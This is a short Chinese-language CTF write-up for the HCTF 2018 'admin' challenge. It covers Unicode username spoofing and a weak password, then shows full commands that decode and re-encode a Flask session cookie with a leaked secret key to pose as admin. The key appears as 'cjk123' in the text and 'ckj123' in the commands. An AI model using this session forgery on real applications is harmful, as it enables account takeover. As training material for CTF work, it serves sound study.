# [HCTF 2018]admin

## 知识点

``

### 1.非预期解

#### 1.1.`Unicode`欺骗

ᴬᴰᴹᴵᴺ

#### 1.2.弱口令

我注册了`admin1`，密码是`123`，登录的时候少输了，输成了`admin`，直接拿到了`flag`，所以密码居然直接是`123`......

### 2.预期解

随便注册账号登录后发现在修改密码处找到了`https://github.com/woadsl1234/hctf_flask/ `

进入`github`看一下，目前已经删除了，看以前的`wp`能发现加密密钥在`config.py`里，为`cjk123`

![session](img/admin-1.png)

需要`session`为`admin` 因为`flask`是轻量级`web`框架，`session`存在客户端，所以我们可以伪造`session`

使用[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

加密
``` bash
python3 flask_session_cookie_manager3.py decode -c ".eJw9kMuKwkAQRX9lqHUWebkRXEQ6hglUhYSOoXojjhM1nbQDUZnY4r9P64Dbe6jDvXWHzX5sz0eYX8Zr68Gm-4b5HT6-YA6FxFBJ6lmSQZ3EKFZ9IahTpoyVXHZs1oYE31DgjeXyyTRmVYdNHSvNvpLlpExtSVNfNDxDeQiKrJ6cLWLLM9KrQRn-Jbke3E1UZOw4zkimMds6VC5zjhvZvCdx8MligDrv2Xy-chSVRlO6jskCHh7szuN-c_np29N7AoXrI9mhU8Jps2qgMA1IPOsnAVqeVLMyZJXGphrQpNbpIiwXL11ntof2bSqbnKvkn5y2xgHYgQfXczu-fgaBD48_zF9qFg.Zb4-YQ.6KG3ddkMAqWZ0Ev3ixN5XmxfkOE" -s "ckj123"
```

![alt text](img/admin-2.png)

重新加密
```bash
python3 flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'936e3da3f20801d83bfd8e0bbef462032a0d83c0db1e8f64e41fe363d9f91858e16c7c6961eff055e1e78f58c9518c56ee7e4272d48473522dbb7e4204c2d6e0', 'csrf_token': b'7ea79bd394de7a5448e05361eaf76c1de2a32d71', 'image': b'AbXD', 'name': 'admin', 'user_id': '10'}"
```

![alt text](img/admin-3.png)

总结：因`flask`将`session`保存在客户端中的(`Cookie`)，导致`session`可修改，找到密钥后把解密后的用户名处改为`admin`重新加密`cookie`即可获取`flag`